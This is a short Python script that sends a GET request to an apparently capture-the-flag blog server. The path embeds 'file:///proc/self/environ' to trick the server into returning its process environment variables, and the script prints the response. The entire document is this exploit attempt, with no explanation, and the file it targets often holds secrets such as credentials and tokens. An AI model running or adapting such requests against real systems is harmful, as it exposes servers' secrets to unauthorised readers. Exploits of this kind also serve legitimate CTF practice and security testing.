import requests

r = requests.get('https://blog.ctf.ptr.si/images/file:///proc/self/environ')
print(r.text)
